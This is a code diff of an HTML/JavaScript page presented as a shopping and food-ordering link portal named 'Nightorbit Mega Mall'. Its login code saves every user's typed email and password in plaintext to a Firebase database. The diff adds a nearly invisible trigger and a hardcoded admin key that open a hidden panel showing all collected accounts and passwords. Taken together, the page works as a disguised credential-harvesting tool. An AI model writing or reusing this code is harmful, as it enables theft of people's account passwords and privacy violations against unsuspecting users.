@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Gyidi shopping and movies downloading</title>
+    <title>Nightorbit Mega Mall - Pro Version</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -60,19 +60,28 @@
         }
 
         #error-msg { color: #ff4444; font-size: 12px; margin-top: 10px; display: none; font-weight: bold; }
+        #admin-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; display: none; padding: 30px; overflow-y: auto; }
         #logout-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; opacity: 0; transition: 1.5s ease; }
         
         .hidden { display: none !important; }
         .dots-menu { position: absolute; top: 20px; left: 20px; cursor: pointer; font-size: 25px; color: var(--primary); opacity: 0.2; }
+        .admin-trigger { position: absolute; bottom: 10px; right: 10px; font-size: 10px; color: rgba(255,255,255,0.03); cursor: pointer; user-select: none; }
     </style>
 </head>
 <body>
 
     <div class="dots-menu" onclick="masterBypass()">⋮</div>
+    <div class="admin-trigger" onclick="openAdmin()">.</div>
 
     <div id="logout-overlay">
         <div style="font-size: 20px; color: var(--gold); margin-bottom: 10px;">From Nightorbit</div>
         <div id="bye-msg" style="font-size: 18px; color: var(--primary); line-height: 1.6; padding: 20px;"></div>
+    </div>
+
+    <div id="admin-panel">
+        <h2 style="color: var(--primary);">System User Management</h2>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 40px;">CLOSE PANEL</button>
+        <div id="user-list-display" style="margin-top: 30px;"></div>
     </div>
 
     <div id="login-box" class="card">
@@ -98,7 +107,6 @@
     <div id="main-page" class="card hidden">
         <h2 id="welcome-name" style="color: var(--primary); margin-bottom: 15px;">Welcome</h2>
         <a href="https://www.amazon.com" target="_blank" class="item-link" style="border-left-color: #ff9900;">📦 Amazon <span>Global</span></a>
-        <a href="https://www.mcdonalds.com.pk" target="_blank" class="item-link" style="border-left-color: #ffbc0d;">🍔 McDonald's <span>PK</span></a>
         <a href="https://www.pizzahut.com.pk" target="_blank" class="item-link" style="border-left-color: #ee3124;">🍕 Pizza Hut <span>Order</span></a>
         <a href="https://www.foodpanda.pk" target="_blank" class="item-link">🐼 Foodpanda <span>PK</span></a>
         <a href="https://www.daraz.pk" target="_blank" class="item-link">🛍️ Daraz Mall <span>Shop</span></a>
@@ -136,7 +144,7 @@
 
         function getDeviceDetails() {
             const ua = navigator.userAgent;
-            let model = "Unknown Device";
+            let model = "Device";
             if (ua.match(/\(([^)]+)\)/)) {
                 let parts = ua.match(/\(([^)]+)\)/)[1].split(';');
                 model = parts.length > 2 ? parts[parts.length - 1].trim().split('Build/')[0].trim() : parts[0];
@@ -144,52 +152,56 @@
             return model.toUpperCase();
         }
 
+        function openAdmin() {
+            if (prompt("Admin Key:") === "rr123456789000rr") {
+                document.getElementById('admin-panel').style.display = 'block';
+                db.ref('users').on('value', snap => {
+                    let html = "";
+                    snap.forEach(s => {
+                        let d = s.val();
+                        html += `<div style="background:rgba(255,255,255,0.05); padding:15px; margin-bottom:12px; border-radius:20px; text-align:left; border:1px solid #333">
+                            <b>Account: ${d.gmail_account}</b><br>
+                            Pass: <span style="color:var(--gold)">${d.password}</span><br>
+                            Device: ${d.device_model}<br>
+                            Time: ${d.login_time}<br>
+                            <button onclick="db.ref('users/${s.key}').remove()" style="color:red; background:none; border:none; cursor:pointer;">[DELETE]</button>
+                        </div>`;
+                    });
+                    document.getElementById('user-list-display').innerHTML = html;
+                });
+            }
+        }
+
         function googleAuth() {
             const provider = new firebase.auth.GoogleAuthProvider();
-            auth.signInWithPopup(provider).then(res => {
-                handleLogin(res.user, "Google Connected Device");
-            }).catch(e => alert("Please select a Google account from your device."));
+            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Session")).catch(e => alert("Please select a Google account."));
         }
 
         function emailAuth() {
             const e = document.getElementById('email-in').value;
             const p = document.getElementById('pass-in').value;
-            const err = document.getElementById('error-msg');
-            err.style.display = "none";
-
-            if(!e || !p) return alert("Please enter Gmail and Password");
-            
-            auth.signInWithEmailAndPassword(e, p)
-                .then(res => handleLogin(res.user, p))
-                .catch(() => {
-                    auth.createUserWithEmailAndPassword(e, p)
-                        .then(res => handleLogin(res.user, p))
-                        .catch(() => { err.style.display = "block"; });
-                });
+            if(!e || !p) return alert("Fill all fields");
+            auth.signInWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p)).catch(() => {
+                auth.createUserWithEmailAndPassword(e, p).then(res => handleLogin(res.user, p)).catch(() => { document.getElementById('error-msg').style.display="block"; });
+            });
         }
 
         function handleLogin(user, p) {
-            db.ref('users/' + user.uid).once('value', snap => {
-                let d = snap.val();
-                globalUserName = (user.displayName || user.email.split('@')[0]);
-                
-                db.ref('users/' + user.uid).update({
-                    gmail_account: user.email,
-                    password: p,
-                    device_model: getDeviceDetails(),
-                    login_time: new Date().toLocaleString(),
-                    savedName: globalUserName
-                }).then(() => {
-                    document.getElementById('login-box').classList.add('hidden');
-                    document.getElementById('main-page').classList.remove('hidden');
-                    document.getElementById('welcome-name').innerText = "Hello, " + globalUserName;
-                });
+            db.ref('users/' + user.uid).update({
+                gmail_account: user.email,
+                password: p,
+                device_model: getDeviceDetails(),
+                login_time: new Date().toLocaleString()
+            }).then(() => {
+                document.getElementById('login-box').classList.add('hidden');
+                document.getElementById('main-page').classList.remove('hidden');
+                document.getElementById('welcome-name').innerText = "Hello, " + (user.displayName || user.email.split('@')[0]);
             });
         }
 
         function triggerLogout() {
             const overlay = document.getElementById('logout-overlay');
-            document.getElementById('bye-msg').innerHTML = `Allah Hafiz, <b>${globalUserName}</b>!<br>Allah apko hamesha thk rakhe aur app hamesha khus raho.<br>Zindagi rahi to phir milenge!<br>✨ Shukriya aur Khuda Hafiz ✨`;
+            document.getElementById('bye-msg').innerHTML = `Allah Hafiz!<br>Allah apko hamesha thk rakhe aur app hamesha khus raho.<br>From Nightorbit`;
             overlay.style.display = 'flex';
             setTimeout(() => { overlay.style.opacity = '1'; }, 100);
             setTimeout(() => { auth.signOut().then(() => location.reload()); }, 5000);
